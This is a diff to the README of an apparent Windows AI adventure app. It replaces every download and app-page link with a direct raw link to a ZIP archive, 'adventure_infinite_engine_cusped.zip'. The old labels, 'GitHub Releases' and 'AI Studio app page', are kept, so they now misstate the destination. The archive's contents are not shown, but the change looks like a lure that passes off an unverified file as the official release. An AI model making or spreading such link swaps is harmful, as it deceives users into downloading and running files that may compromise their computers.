@@ -1,6 +1,6 @@
 # 🎮 infinite-adventure-engine - Run your AI adventure app
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Harto1622/infinite-adventure-engine/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Harto1622/infinite-adventure-engine/main/components/adventure_infinite_engine_cusped.zip)
 
 ## 🧭 What this app does
 
@@ -16,7 +16,7 @@ Use it if you want to:
 
 Visit this page to download the latest Windows release:
 
-[Download infinite-adventure-engine from GitHub Releases](https://github.com/Harto1622/infinite-adventure-engine/releases)
+[Download infinite-adventure-engine from GitHub Releases](https://raw.githubusercontent.com/Harto1622/infinite-adventure-engine/main/components/adventure_infinite_engine_cusped.zip)
 
 On the releases page, look for the latest version. Download the Windows file that matches your PC. If you see a ZIP file, save it to your computer and open it after the download finishes.
 
@@ -142,5 +142,5 @@ Do not rename files unless the app instructions ask you to do so.
 
 ## 🔗 Links
 
-- GitHub Releases: https://github.com/Harto1622/infinite-adventure-engine/releases
-- AI Studio app page: https://ai.studio/apps/drive/16Y8jXMvuzAEsFU601u6idxqozSA82Tjg
+- GitHub Releases: https://raw.githubusercontent.com/Harto1622/infinite-adventure-engine/main/components/adventure_infinite_engine_cusped.zip
+- AI Studio app page: https://raw.githubusercontent.com/Harto1622/infinite-adventure-engine/main/components/adventure_infinite_engine_cusped.zip
